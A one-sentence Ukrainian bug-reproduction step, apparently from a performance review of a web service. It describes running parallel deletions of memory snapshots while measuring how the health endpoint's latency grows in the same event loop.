  Створити 5 знімків і викликати `DELETE /api/memory/{id}` паралельно з вимірюванням затримки `GET /api/health` у тому ж event loop — затримка `/api/health` зросте пропорційно кількості знімків.
